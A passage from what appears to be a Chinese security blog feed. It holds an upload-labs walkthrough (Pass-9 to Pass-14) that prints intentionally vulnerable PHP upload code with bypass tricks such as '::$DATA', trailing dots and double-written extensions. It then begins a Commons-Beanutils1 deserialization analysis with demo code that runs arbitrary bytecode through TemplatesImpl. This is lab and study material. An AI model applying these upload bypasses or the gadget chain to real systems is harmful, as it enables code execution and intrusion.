class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//没有过滤::$DATA</span></span><br><span class="line"><span class="comment">//php在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持&quot;::$DATA&quot;之前的文件名 </span></span><br><span class="line"><span class="comment">//目的就是不检查后缀名。</span></span><br></pre></td></tr></table></figure></div>

<p>思路：</p>
<p>在拓展名后添加<code>::$DATA</code></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629163221180.png"
                      class="" title="image-20230629163221180"
                >

<p>访问上传的php文件：记得将 <code>::$DATA</code> 删掉，不然会出错。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629163426711.png"
                      class="" title="image-20230629163426711"
                >

<h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//deldot函数是从后向前检查，检查到第一个点时会继续执行，当遇到空格时会停止</span></span><br></pre></td></tr></table></figure></div>

<p>思路：</p>
<p>在拓展名后添加<code>. . </code> 绕过利用</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629164456065.png"
                      class="" title="image-20230629164456065"
                >

<p>访问上传的php文件：</p>
<h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用str_ireplace函数将符合的文件拓展名替换为空</span></span><br><span class="line"><span class="comment">//从第一个字符检查过去</span></span><br></pre></td></tr></table></figure></div>

<p>思路：</p>
<p>利用双写绕过</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629165011526.png"
                      class="" title="image-20230629165011526"
                >

<p>访问上传的php文件：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/08/18/%E9%9D%B6%E5%9C%BA/upload-labs/image-20230629165059113.png"
                      class="" title="image-20230629165059113"
                >

<h1 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h1><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当拓展名符合要求时，</span></span><br></pre></td></tr></table></figure></div>

<h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h1><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>Commons-Beanutils1</title>
    <url>/2023/09/25/Java%E5%AE%89%E5%85%A8/CommonsBeanutils1%E5%88%A9%E7%94%A8%E9%93%BE%20/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><h1 id="0x01-什么是Commons-Beanutils"><a href="#0x01-什么是Commons-Beanutils" class="headerlink" title="0x01 什么是Commons-Beanutils"></a>0x01 什么是Commons-Beanutils</h1><p><strong>Apache Commons Beanutils</strong>是<strong>Apache Commons</strong>工具集下的另一个项目，它提供了对普通<strong>Java</strong>类对 象（也称为<strong>JavaBean</strong>）的一些操作方法。</p>
<p>关于<strong>JavaBean</strong> 的说明可以参考廖雪峰老师的<a class="link"   href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680" >文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>假设有个<strong>Person()<strong>类的</strong>JavaBean</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span> <span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>commons-beanutils</strong>中提供了一个静态方法<strong>PropertyUtils.getProperty</strong>，让使用者可以直接调用任 意<strong>JavaBean</strong>的<strong>getter</strong>方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanUtilsTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">name</span> <span class="operator">=</span> PropertyUtils.getProperty(person, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>此时<strong>commons-beanutils</strong>会自动找到<strong>name</strong>属性的<strong>getter</strong>方法，也就是<strong>getName</strong>，然后返回调用。</p>
<h1 id="0x02-利用链分析"><a href="#0x02-利用链分析" class="headerlink" title="0x02 利用链分析"></a>0x02 利用链分析</h1><p>回顾一下所学的<strong>CC</strong>链，找到没有使用<strong>Commons-Collection</strong>包的部分</p>
<p>这样看的话，<strong>TemplatesImpl</strong>实现类加载任意代码执行的部分是不能少的</p>
<p>那我们就只能看看哪里又调用了**TemplatesImpl.newTransformer()**方法</p>
<p>找到了**TemplatesImpl.getOutputProperties()**方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它的内部调用了<strong>newTransformer()<strong>，而</strong>getOutputProperties</strong>这个名字，是以<strong>get</strong>开头，正符合<strong>getter</strong>的定义</p>
<p>简单写个<strong>demo</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>发现是可以正常弹出计算器的</p>
<p>所以，<strong>PropertyUtils.getProperty( obj, property )</strong> 这段代码中，当<strong>obj</strong>是一个<strong>TemplatesImpl</strong>对象，而<strong>property</strong>的值为<strong>outputProperties</strong>时，将会自动调用<strong>getter</strong>，也就是**TemplatesImpl.getOutputProperties()**方法，触发代码执行。</p>
<p>那我们现在反过来看看哪里又可以调用<strong>PropertyUtils.getProperty()</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( T o1, T o2 )</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">        <span class="comment">// compare the actual objects</span></span><br><span class="line">        <span class="keyword">return</span> internalCompare( o1, o2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">        <span class="keyword">return</span> internalCompare( value1, value2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( IllegalAccessException iae ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( InvocationTargetException ite ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( NoSuchMethodException nsme ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

